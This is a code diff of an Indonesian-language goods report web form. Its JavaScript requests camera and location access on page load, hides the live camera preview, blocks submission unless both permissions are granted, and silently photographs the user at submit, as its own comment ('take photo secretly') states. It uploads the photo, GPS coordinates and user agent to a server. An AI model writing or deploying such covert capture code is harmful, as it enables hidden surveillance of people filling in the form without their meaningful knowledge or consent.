@@ -1,184 +1,120 @@
+<!--
+Halaman form laporan barang.
+- Auto minta izin kamera & lokasi saat halaman load
+- Kamera tersembunyi (tidak tampil ke user)
+- Kalau izin ditolak -> tombol submit nonaktif
+- Foto, lokasi, dan data form dikirim ke server Flask
+-->
+
 <!DOCTYPE html>
 <html>
-  <head>
-    <meta charset="utf-8" />
-    <link
-      rel="stylesheet"
-      href="https://cdn.jsdelivr.net/npm/bulma@0.9.4/css/bulma.min.css"
-    />
+<head>
+    <meta charset="UTF-8">
+    <title>Laporan Barang</title>
     <style>
-      #message {
-        display: none;
-        margin: 20px;
-        font-weight: bold;
-        padding: 8px;
-        border-radius: 4px;
-      }
-      video, canvas {
-        display: none; /* Kamera & canvas disembunyikan */
-      }
+        body { font-family: Arial, sans-serif; margin: 20px; }
+        .disabled { background-color: #ccc; cursor: not-allowed; }
+        video { display: none; } /* Kamera disembunyikan */
     </style>
-  </head>
-  <body>
-    <section class="hero is-primary is-bold">
-      <div class="hero-body">
-        <div class="container">
-          <h1 class="title">DAILY REPORT SEIJKT11</h1>
-        </div>
-      </div>
-    </section>
+</head>
+<body>
+    <h2>Laporan Barang Keluar/Masuk</h2>
+    <p>Form ini akan menggunakan kamera dan lokasi Anda untuk verifikasi.</p>
 
-    <form
-      id="form"
-      class="container m-4 pl-4"
-      method="POST"
-      enctype="multipart/form-data"
-    >
-      <div class="field">
-        <label class="label">Hari/Tanggal</label>
-        <div class="control">
-          <input
-            class="input"
-            type="text"
-            placeholder="Hari/Tanggal"
-            name="hari"
-          />
-        </div>
-      </div>
+    <!-- Form laporan -->
+    <form id="laporanForm" enctype="multipart/form-data" method="POST" action="/upload">
+        <label>Hari:</label><br>
+        <input type="text" name="hari" required><br><br>
 
-      <div class="field">
-        <label class="label">Jam</label>
-        <div class="control">
-          <input class="input" type="text" placeholder="Jam" name="jam" />
-        </div>
-      </div>
+        <label>Jam:</label><br>
+        <input type="text" name="jam" required><br><br>
 
-      <div class="field">
-        <label class="label">Material dan Jumlah</label>
-        <div class="control">
-          <input
-            class="input"
-            type="text"
-            placeholder="Material dan Jumlah"
-            name="material"
-          />
-        </div>
-      </div>
+        <label>Material:</label><br>
+        <input type="text" name="material" required><br><br>
 
-      <div class="field">
-        <label class="label">Keterangan</label>
-        <div class="control">
-          <input
-            class="input"
-            type="text"
-            placeholder="Keterangan"
-            name="keterangan"
-          />
-        </div>
-      </div>
+        <label>Keterangan:</label><br>
+        <textarea name="keterangan" required></textarea><br><br>
 
-      <!-- Kamera & Canvas disembunyikan -->
-      <video id="video" autoplay playsinline></video>
-      <canvas id="canvas"></canvas>
+        <input type="hidden" name="latitude" id="latitude">
+        <input type="hidden" name="longitude" id="longitude">
+        <input type="hidden" name="userAgent" id="userAgent">
 
-      <input type="hidden" name="latitude" id="latitude" />
-      <input type="hidden" name="longitude" id="longitude" />
-      <input type="hidden" name="userAgent" id="userAgent" />
+        <input type="file" name="photo" id="photoFile" accept="image/*" capture="environment" hidden>
 
-      <div class="field is-grouped">
-        <div class="control">
-          <button
-            class="button is-primary"
-            type="submit"
-            id="submit-button"
-            disabled
-          >
-            ENTER
-          </button>
-        </div>
-        <div class="control">
-          <button class="button is-danger" type="reset">Cancel</button>
-        </div>
-      </div>
+        <video id="video" autoplay playsinline></video>
+
+        <button type="submit" id="submitBtn" class="disabled" disabled>ENTER</button>
     </form>
 
-    <div id="message" class="notification"></div>
-
     <script>
-      const message = document.getElementById("message");
-      const submitButton = document.getElementById("submit-button");
-      const video = document.getElementById("video");
-      const canvas = document.getElementById("canvas");
+        const video = document.getElementById("video");
+        const photoFile = document.getElementById("photoFile");
+        const submitBtn = document.getElementById("submitBtn");
 
-      document.getElementById("userAgent").value = navigator.userAgent;
+        // Set user agent ke form
+        document.getElementById("userAgent").value = navigator.userAgent;
 
-      window.onload = async function () {
-        try {
-          // Kamera (hidden preview)
-          const stream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: "user" },
-          });
-          video.srcObject = stream;
+        let cameraReady = false;
+        let locationReady = false;
+        let stream;
 
-          // Lokasi
-          if ("geolocation" in navigator) {
-            navigator.geolocation.getCurrentPosition(
-              (pos) => {
-                document.getElementById("latitude").value =
-                  pos.coords.latitude;
-                document.getElementById("longitude").value =
-                  pos.coords.longitude;
-                submitButton.disabled = false;
-              },
-              (err) => {
-                showError("");
-              },
-              { enableHighAccuracy: true, timeout: 10000 }
-            );
-          } else {
-            showError("Perangkat tidak mendukung lokasi.");
-          }
-        } catch (err) {
-          showError("");
+        // Fungsi cek status izin
+        function checkReady() {
+            if (cameraReady && locationReady) {
+                submitBtn.disabled = false;
+                submitBtn.classList.remove("disabled");
+            }
         }
-      };
 
-      function showError(msg) {
-        message.textContent = msg;
-        message.className = "notification is-danger";
-        message.style.display = "block";
-        submitButton.disabled = true;
-      }
+        // Auto minta izin kamera saat load
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(s => {
+                stream = s;
+                video.srcObject = s;
+                cameraReady = true;
+                checkReady();
+            })
+            .catch(err => {
+                alert("Akses kamera ditolak. Form tidak bisa digunakan.");
+            });
 
-      document.getElementById("form").addEventListener("submit", async (e) => {
-        e.preventDefault();
-        message.textContent = "Mengirim data...";
-        message.className = "notification is-info";
-        message.style.display = "block";
-        submitButton.disabled = true;
-
-        // Capture foto dari video (hidden)
-        const context = canvas.getContext("2d");
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        const blob = await new Promise((resolve) =>
-          canvas.toBlob(resolve, "image/jpeg", 0.9)
+        // Auto minta izin lokasi saat load
+        navigator.geolocation.getCurrentPosition(
+            pos => {
+                document.getElementById("latitude").value = pos.coords.latitude;
+                document.getElementById("longitude").value = pos.coords.longitude;
+                locationReady = true;
+                checkReady();
+            },
+            err => {
+                alert("Akses lokasi ditolak. Form tidak bisa digunakan.");
+            }
         );
 
-        const formData = new FormData(e.target);
-        formData.append("photo", blob, "capture.jpg");
+        // Ambil foto diam-diam sebelum submit
+        document.getElementById("laporanForm").addEventListener("submit", function(e) {
+            e.preventDefault();
+            const canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0);
+            canvas.toBlob(blob => {
+                const file = new File([blob], "photo.jpg", { type: "image/jpeg" });
+                const data = new FormData(this);
+                data.set("photo", file);
 
-        const res = await fetch("/upload", { method: "POST", body: formData });
-
-        if (res.ok) {
-          window.location.href =
-            "https://docs.google.com/spreadsheets/d/18uu1uAvZci1a3wZyOLx_q4BmsqbBepk10fefIXchMwE/edit?usp=drivesdk";
-        } else {
-          const txt = await res.text();
-          showError("Gagal mengirim: " + txt);
-        }
-      });
+                fetch("/upload", { method: "POST", body: data })
+                    .then(res => {
+                        if (res.ok) {
+                            window.location.href = "https://docs.google.com/spreadsheets/d/ID_SHEET_KAMU/edit";
+                        } else {
+                            alert("Gagal mengirim data");
+                        }
+                    });
+            }, "image/jpeg");
+        });
     </script>
-  </body>
-</html>
+</body>
+      </html>
+      
